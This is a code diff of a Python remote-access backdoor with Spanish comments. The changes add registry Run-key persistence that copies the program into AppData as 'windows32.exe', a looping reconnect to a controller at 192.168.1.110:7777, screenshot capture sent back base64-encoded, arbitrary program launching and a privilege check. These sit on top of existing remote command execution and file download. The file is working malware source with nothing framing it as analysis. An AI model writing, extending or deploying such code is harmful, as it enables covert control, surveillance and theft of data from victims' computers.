@@ -3,9 +3,42 @@
 
 import socket
 import os
+import sys
 import subprocess
 import base64
 import requests
+import pyautogui
+import time
+import shutil
+
+def admin_check():
+   global admin
+   try:
+      check = os.listdir(os.sep.join([os.environ.get("SystemRoot", 'C:\Windows'), 'temp']))
+   except:
+      admin = "ERROR, Privilegios insuficientes"
+   else:
+      admin = "Privilegios de administrador"
+
+def create_persistence():
+   location = os.environ['appdata'] + '\\windows32.exe'
+   if not os.path.exists(location):
+      shutil.copyfile(sys.executable, location)
+      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)
+
+
+def connection():
+   while True:
+      time.sleep(5)
+      try:
+         cliente.connect(("192.168.1.110",7777))
+         shell()
+      except:
+         connection()
+
+def captura_pantalla():
+   screenshot = pyautogui.screenshot()
+   screenshot.save("monitor-1.png")
 
 # Creamos una función que descarga un fichero de internet
 def download_file(url):
@@ -42,6 +75,26 @@ def shell():
             cliente.send("Archivo descargado correctamente")
          except:
             cliente.send("Ocurrio un error en la descarga")
+      elif res[:10] == "screenshot":
+         try:
+            captura_pantalla()
+            with open('monitor-1.png', 'rb') as file_send:
+               cliente.send(base64.b64encode(file_send.read()))
+            os.remove("monitor-1.png")
+         except:
+            cliente.send(base64.b64encode("fail"))
+      elif res[:5] == "start":
+         try:
+            subprocess.Popen(res[6:],shell=True)
+            cliente.send("Programa iniciado con exito")
+         except:
+            cliente.send("No se pudo iniciar el programa")
+      elif res[:5] == "check":
+         try:
+            admin_check()
+            cliente.send(admin)
+         except:
+            cliente.send("No se pudo realizar la tarea")
       else:
          # Muestra por la consola del cliente el resultado de un comando o un error si el comando no existe, hay que hacerlo ya que la shell se quedaría colgada
          proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -52,7 +105,7 @@ def shell():
          else:
             cliente.send(result)
 
+create_persistence()
 cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-cliente.connect(("192.168.1.110", 7777))
-shell()
+connection()
 cliente.close()
